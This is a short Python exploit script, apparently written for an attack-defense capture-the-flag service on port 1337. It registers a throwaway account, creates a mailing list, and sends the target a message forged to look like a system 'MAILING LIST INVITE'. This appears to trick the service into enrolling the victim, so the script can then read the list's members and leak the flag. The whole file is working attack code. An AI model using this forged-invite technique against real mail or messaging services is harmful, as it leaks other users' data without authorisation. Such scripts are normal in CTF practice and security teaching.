#!/usr/bin/env python3

import sys
from client import Client
import string
import random


PORT = 1337
alphabet = string.ascii_letters + string.digits


def get_random_str(len):
    return ''.join(random.choice(alphabet) for i in range(len))


def exploit(ip, flag_id):
    c1 = Client(ip, PORT)
    c1.connect()
    c1.register(get_random_str(20), get_random_str(20), get_random_str(20), get_random_str(20))
    
    name = get_random_str(20)
    c1.create_mailinglist(name, get_random_str(20))
    c1.join_mailinglist(flag_id)
    c1.send_mail(flag_id, get_random_str(20), f"===`==MAILING LIST INVITE=====\nYou are kindly invited to join my mailing list: {name}\n=====MAILING LIST INVITE=====")
    return c1.get_mailinglist_users(name)


if __name__ == "__main__":
    ip = sys.argv[1]
    flag_id = sys.argv[2]
    print(exploit(ip, flag_id))
